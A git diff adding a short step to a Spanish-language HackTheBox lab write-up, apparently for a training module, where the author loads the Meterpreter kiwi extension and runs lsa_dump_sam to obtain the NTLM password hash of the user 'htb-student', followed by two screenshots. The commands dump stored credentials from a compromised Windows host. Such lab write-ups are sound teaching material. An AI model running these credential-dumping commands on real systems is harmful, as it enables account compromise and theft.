@@ -810,4 +810,17 @@ Obtenemos el usuario:
 
 #### Obtenga el hash de la contraseña NTLM del usuario "htb-student". Envíe el hash como respuesta.
 
+Como ya tenemos meterpreter, vamos a correr `lsa_dump_sam`, primero tenemos que cargar `kiwi`:
+
+```bash
+load kiwi
+lsa_dump_sam
+```
+
+<img width="1261" height="736" alt="image" src="https://github.com/user-attachments/assets/c4e0d3e0-8c8b-4afc-b053-272408f298b8" />
+
+
+<img width="873" height="208" alt="image" src="https://github.com/user-attachments/assets/5eb42c02-f4cf-4821-bb5d-fc46f97b52c7" />
+
+
 
